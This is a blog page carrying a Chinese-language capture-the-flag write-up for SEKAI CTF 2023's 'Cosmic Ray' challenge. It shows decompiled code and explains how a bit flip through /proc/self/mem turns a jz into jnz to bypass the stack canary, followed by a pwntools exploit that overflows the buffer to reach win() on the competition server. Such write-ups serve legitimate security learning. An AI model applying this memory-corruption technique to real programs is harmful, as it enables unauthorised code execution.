@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Sekai CTF 2023 Writeup周末都在 AIS3 Club，賽中只解出 Cosmic Ray Cosmic Ray 用 IDA 打開後發現有 buffer overflow，但有開 canary，所以要想辦法 leak 或讓它壞掉有給一個 win()，會直接輸出 flag 123456789101112131415161718192021222324int __cdecl main(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEKAI CTF 2023 Writeup">
+<meta property="og:url" content="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/index.html">
+<meta property="og:site_name" content="Terry1234&#39;s blog">
+<meta property="og:description" content="Sekai CTF 2023 Writeup周末都在 AIS3 Club，賽中只解出 Cosmic Ray Cosmic Ray 用 IDA 打開後發現有 buffer overflow，但有開 canary，所以要想辦法 leak 或讓它壞掉有給一個 win()，會直接輸出 flag 123456789101112131415161718192021222324int __cdecl main(">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/checksec.png">
+<meta property="og:image" content="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/IDA.png">
+<meta property="og:image" content="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/flag.png">
+<meta property="article:published_time" content="2023-08-29T11:36:07.000Z">
+<meta property="article:modified_time" content="2025-09-08T11:39:08.979Z">
+<meta property="article:author" content="Terry1234">
+<meta property="article:tag" content="CTF writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/checksec.png">
+
+<link rel="canonical" href="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SEKAI CTF 2023 Writeup | Terry1234's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Terry1234's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我們終會抵達各自的終點</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Terry1234">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Terry1234's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SEKAI CTF 2023 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-08-29 19:36:07" itemprop="dateCreated datePublished" datetime="2023-08-29T19:36:07+08:00">2023-08-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-09-08 19:39:08" itemprop="dateModified" datetime="2025-09-08T19:39:08+08:00">2025-09-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Sekai-CTF-2023-Writeup"><a href="#Sekai-CTF-2023-Writeup" class="headerlink" title="Sekai CTF 2023 Writeup"></a>Sekai CTF 2023 Writeup</h1><p>周末都在 AIS3 Club，賽中只解出 Cosmic Ray</p>
+<h2 id="Cosmic-Ray"><a href="#Cosmic-Ray" class="headerlink" title="Cosmic Ray"></a>Cosmic Ray</h2><p><img src="/2023/08/29/SEKAI-CTF-2023-Writeup/checksec.png"></p>
+<p>用 IDA 打開後發現有 buffer overflow，但有開 canary，所以要想辦法 leak 或讓它壞掉<br>有給一個 win()，會直接輸出 flag</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 addr; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf_0(_bss_start, <span class="number">0LL</span>, envp);</span><br><span class="line">  puts_0(<span class="string">&quot;Welcome to my revolutionary new cosmic ray machine!&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;Give me any address in memory and I&#x27;ll send a cosmic ray through it:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;0x%lx&quot;</span>, &amp;addr);</span><br><span class="line">  getchar_0(<span class="string">&quot;0x%lx&quot;</span>, &amp;addr);</span><br><span class="line">  cosmic_ray((__int64)&amp;v8, addr);</span><br><span class="line">  puts_0(<span class="string">&quot;Please write a review of your experience today:&quot;</span>);</span><br><span class="line">  gets_0(&amp;v6);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟進去 cosmic_ray()，發現它會把我們給的 address 裡的資料取出來，可以選擇翻轉其中 1 bit 再把資料寫回去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __usercall cosmic_ray@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;, __int64 addr@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp-34h] [rbp-34h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp-2Ch] [rbp-2Ch]</span></span><br><span class="line">  _BYTE *bin_arr; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [rsp-12h] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v11 = a1;</span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v6 = open_0(<span class="string">&quot;/proc/self/mem&quot;</span>, <span class="number">2LL</span>);</span><br><span class="line">  lseek_0(v6, addr, <span class="number">0LL</span>);</span><br><span class="line">  read_0(v6, &amp;v9, <span class="number">1LL</span>);</span><br><span class="line">  bin_arr = get_bin(v9);</span><br><span class="line">  puts_0(<span class="string">&quot;\n|0|1|2|3|4|5|6|7|&quot;</span>);</span><br><span class="line">  printf_0();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)bin_arr[i];</span><br><span class="line">    printf_0();</span><br><span class="line">  &#125;</span><br><span class="line">  puts_0(<span class="string">&quot;\n\nEnter a bit position to flip (0-7):&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  getchar_0(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">7</span> )</span><br><span class="line">    exit_0(<span class="number">1LL</span>);</span><br><span class="line">  v8 = flip_bit((__int64)bin_arr, idx);</span><br><span class="line">  HIBYTE(v9) = binary_to_byte((__int64)&amp;v11, v8);</span><br><span class="line">  printf_0();</span><br><span class="line">  lseek_0(v6, addr, <span class="number">0LL</span>);</span><br><span class="line">  write_0();</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看了 flit_bit() 與 binary_to_byte() 都沒發現漏洞，後面也沒有發現可以做 leak 的地方<br>由於它是 Partial RELRO 的關係，有想到透過 GOT Hijacking 來把 puts() gets() __stack_check_fail() 其中一個的 GOT 寫成 win()，但用 gdb 看一下發現地址差得有點多，無法只透過翻 1 bit 來改成 win()</p>
+<p>回去看 cosmic_ray() 發現它是透過讀寫 &#x2F;proc&#x2F;self&#x2F;mem 來完成操作的，之前打 Google CTF 2023 時有遇到一題 write-flag-where 也是類似的作法，由於讀寫 &#x2F;proc&#x2F;self&#x2F;mem 可以無視 pages 的權限，所以可以更改 .text 段的內容。</p>
+<p>這邊可以將 jz(opcode &#x3D; 0x74) 寫成 jnz(opcode &#x3D; 0x75)，使程式不呼叫 __stack_check_fail() 來通過檢查</p>
+<p><img src="/2023/08/29/SEKAI-CTF-2023-Writeup/IDA.png"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chals.sekai.team&#x27;</span>, <span class="number">4077</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./cosmicray&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./cosmicray&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = elf.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x74 -&gt; 0x75</span></span><br><span class="line"><span class="comment">#jz -&gt; jnz</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(<span class="number">0x4016f4</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/29/SEKAI-CTF-2023-Writeup/flag.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-writeup/" rel="tag"># CTF writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/13/starctf-oob/" rel="prev" title="starctf oob writeup">
+      <i class="fa fa-chevron-left"></i> starctf oob writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/12/Balsn-CTF-2023-Writeup/" rel="next" title="Balsn CTF 2023 Writeup">
+      Balsn CTF 2023 Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sekai-CTF-2023-Writeup"><span class="nav-number">1.</span> <span class="nav-text">Sekai CTF 2023 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmic-Ray"><span class="nav-number">1.1.</span> <span class="nav-text">Cosmic Ray</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Terry1234</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Terry1234</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
